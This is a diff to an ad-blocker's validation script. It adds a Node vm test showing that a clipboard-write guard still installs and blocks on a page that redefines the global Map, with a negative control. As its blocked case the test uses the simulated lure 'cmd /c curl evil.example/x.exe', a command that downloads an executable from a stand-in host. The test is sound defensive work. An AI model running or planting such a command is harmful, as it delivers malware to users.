@@ -6,6 +6,7 @@
 // into a ruleset, DNR conditions are well-formed, and the budgets hold.
 import { readFileSync, existsSync, readdirSync, statSync } from 'node:fs';
 import { resolve } from 'node:path';
+import vm from 'node:vm';
 import { ROOT } from './lib/backup.mjs';
 import { checkRegex } from './lib/re2check.mjs';
 import { VALID_TOP_LEVEL } from './lib/sanitize.mjs';
@@ -126,6 +127,61 @@ function validateRule(rule, where, seenIds) {
         regex: cond.regexFilter !== undefined ? 1 : 0,
         unsafe: SAFE_ACTIONS.has(action.type) ? 0 : 1,
     };
+}
+
+// Run a MAIN-world bundle in a fresh realm standing in for a page, apply
+// prevent-clipboard-write, then do what iretail.pnb.bank.in's NMap.js does --
+// declare a global `function Map()` with no has() -- before the first
+// mousemove installs the traps (see NATIVE_CTORS in tools/emit-scriptlets.mjs).
+// Returns what happened, so a caller can also run it on a broken bundle.
+function lateTrapsUnderPageMap(src) {
+    // Request, EventTarget and fetch are host globals, not realm intrinsics;
+    // safeSelf() reads them at its first call. The page objects are built
+    // inside the realm: proxyApplyFn walks its target path with
+    // `instanceof Object`, which an object from another realm fails.
+    const ctx = vm.createContext({ console, Request, EventTarget, fetch });
+    vm.runInContext(`
+        globalThis.self = globalThis;
+        globalThis.location = { hostname: 'bank.example' };
+        globalThis.__t = { listeners: [], execCalls: 0, selection: '' };
+        globalThis.navigator = { clipboard: { writeText: async function writeText() { } } };
+        globalThis.document = {
+            readyState: 'complete',
+            documentElement: {},
+            addEventListener(type, fn) { __t.listeners.push({ type, fn }); },
+            removeEventListener() { },
+            execCommand: function execCommand() { __t.execCalls += 1; return true; },
+            getSelection: ( ) => ({ toString: ( ) => __t.selection }),
+        };
+        __t.execCommand = document.execCommand;
+        __t.writeText = navigator.clipboard.writeText;
+    `, ctx);
+    const page = code => vm.runInContext(code, ctx);
+    page(src);
+    if ( page(`globalThis.__ubmv3_main?.run('prevent-clipboard-write.js', [ '/^cmd /' ])`) !== true ) {
+        return { error: 'prevent-clipboard-write.js is not in the MAIN bundle' };
+    }
+    page('function Map() { this.keyArray = []; this.valArray = []; }');
+    if ( page('typeof new Map().has') !== 'undefined' ) {
+        return { error: 'the page-style Map declaration did not replace the global' };
+    }
+    const moves = page(`__t.listeners.filter(l => l.type === 'mousemove').length`);
+    if ( moves !== 1 ) { return { error: `expected 1 mousemove listener, got ${moves}` }; }
+    try {
+        page(`__t.listeners.find(l => l.type === 'mousemove').fn()`);
+    } catch ( reason ) {
+        return { threw: String(reason.message) };
+    }
+    return page(`(( ) => {
+        const installed = document.execCommand !== __t.execCommand && navigator.clipboard.writeText !== __t.writeText;
+        __t.selection = 'cmd /c curl evil.example/x.exe';
+        document.execCommand('copy');
+        const blocked = __t.execCalls === 0;
+        __t.selection = 'hello';
+        document.execCommand('copy');
+        const passed = __t.execCalls === 1;
+        return { installed, blocked, passed };
+    })()`);
 }
 
 async function main() {
@@ -545,6 +601,25 @@ async function main() {
             } else {
                 note(`popup filters: ${loaded} loaded from ${lists.length} lists; self-test ok (${host}); DNR output unaffected`);
             }
+        }
+    }
+
+    // --- scriptlets under page-redefined globals (NATIVE_CTORS) ----------------
+    {
+        const src = readFileSync(resolve(DIST, 'scriptlets', 'main-bundle.js'), 'utf-8');
+        const now = lateTrapsUnderPageMap(src);
+        // Negative control: the same bundle with the fix taken back out must
+        // fail exactly as the bank page did, or this check proves nothing.
+        const unfixed = src.replace('proxyApplyFn.isCtor = new nativeMap();', 'proxyApplyFn.isCtor = new Map();');
+        const control = unfixed === src ? { error: 'fix site not found in the built bundle' } : lateTrapsUnderPageMap(unfixed);
+        if ( now.error !== undefined || now.threw !== undefined ) {
+            fail(`clipboard guard under a page-declared Map: ${now.error ?? `threw "${now.threw}"`}`);
+        } else if ( now.installed !== true || now.blocked !== true || now.passed !== true ) {
+            fail(`clipboard guard under a page-declared Map: installed=${now.installed} blocked=${now.blocked} passed=${now.passed}`);
+        } else if ( control.threw !== 'proxyApplyFn.isCtor.has is not a function' ) {
+            fail(`page-Map negative control did not reproduce the bank error: ${JSON.stringify(control)}`);
+        } else {
+            note('clipboard guard under a page-declared Map: traps install and block; unfixed control throws as the bank page did');
         }
     }
 
